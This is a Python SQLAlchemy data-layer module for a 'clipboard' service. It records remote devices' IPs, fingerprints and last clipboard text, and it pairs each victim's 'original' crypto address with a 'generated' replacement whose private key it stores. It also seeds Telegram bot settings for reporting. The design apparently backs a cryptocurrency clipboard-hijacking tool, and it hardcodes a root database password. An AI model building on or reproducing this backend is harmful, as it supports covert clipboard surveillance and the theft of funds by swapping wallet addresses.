from __future__ import annotations

import os
import time
from contextlib import contextmanager
from typing import Generator

from sqlalchemy import Boolean, Column, Integer, String, Text, create_engine
from sqlalchemy.orm import declarative_base, sessionmaker, Session


MYSQL_URL = os.environ.get("MYSQL_URL", "mysql+pymysql://root:303816@127.0.0.1:3306/clipboard")

engine = create_engine(MYSQL_URL, pool_pre_ping=True, future=True)
SessionLocal = sessionmaker(bind=engine, autoflush=False, autocommit=False, future=True, expire_on_commit=False)
Base = declarative_base()


class Device(Base):
    __tablename__ = "devices"

    id = Column(Integer, primary_key=True, autoincrement=True)
    device_id = Column(String(128), unique=True, index=True, nullable=False)
    fingerprint = Column(String(128), index=True, nullable=True)
    ip = Column(String(64), nullable=True)
    note = Column(Text, nullable=True)
    last_clip_text = Column(Text, nullable=True)
    last_seen = Column(Integer, nullable=False, default=lambda: int(time.time()))
    connected = Column(Boolean, nullable=False, default=False)


class SysSettings(Base):
    __tablename__ = "sys_settings"

    id = Column(Integer, primary_key=True, autoincrement=True)
    key = Column(String(128), unique=True, nullable=False)
    value = Column(Text, nullable=True)
    description = Column(String(256), nullable=True)
    created_at = Column(Integer, nullable=False, default=lambda: int(time.time()))
    updated_at = Column(Integer, nullable=False, default=lambda: int(time.time()))


class MessageDeviceMapping(Base):
    __tablename__ = "message_device_mapping"

    id = Column(Integer, primary_key=True, autoincrement=True)
    message_id = Column(Integer, unique=True, nullable=False)
    device_id = Column(String(128), nullable=False)
    created_at = Column(Integer, nullable=False, default=lambda: int(time.time()))


class GeneratedAddress(Base):
    __tablename__ = "generated_addresses"

    id = Column(Integer, primary_key=True, autoincrement=True)
    device_id = Column(String(128), nullable=False)
    original_address = Column(String(256), nullable=False)
    generated_address = Column(String(256), nullable=False)
    private_key = Column(String(256), nullable=False)
    address_type = Column(String(32), nullable=False)
    balance = Column(String(64), nullable=False, default="0")
    created_at = Column(Integer, nullable=False, default=lambda: int(time.time()))


def init_db() -> None:
    Base.metadata.create_all(bind=engine)
    
    # 初始化系统设置
    with get_session() as session:
        # 检查是否已有设置
        tg_token = session.query(SysSettings).filter(SysSettings.key == "tg_bot_token").first()
        if not tg_token:
            session.add(SysSettings(
                key="tg_bot_token",
                value="",
                description="Telegram Bot Token"
            ))
        
        tg_chat_id = session.query(SysSettings).filter(SysSettings.key == "tg_chat_id").first()
        if not tg_chat_id:
            session.add(SysSettings(
                key="tg_chat_id",
                value="",
                description="Telegram Chat/Group ID"
            ))
        
        session.commit()


@contextmanager
def get_session() -> Generator[Session, None, None]:
    session: Session = SessionLocal()
    try:
        yield session
        session.commit()
    except Exception:
        session.rollback()
        raise
    finally:
        session.close()


def upsert_device(session: Session, *, device_id: str, ip: str | None = None,
                  fingerprint: str | None = None, last_clip_text: str | None = None,
                  connected: bool | None = None, note: str | None = None) -> Device:
    """Create or update a device record."""
    device: Device | None = session.query(Device).filter(Device.device_id == device_id).one_or_none()
    if device is None:
        device = Device(device_id=device_id)
        session.add(device)

    if ip is not None:
        device.ip = ip
    if fingerprint is not None:
        device.fingerprint = fingerprint
    if last_clip_text is not None:
        device.last_clip_text = last_clip_text
    if connected is not None:
        device.connected = connected
    if note is not None:
        device.note = note
    device.last_seen = int(time.time())
    return device


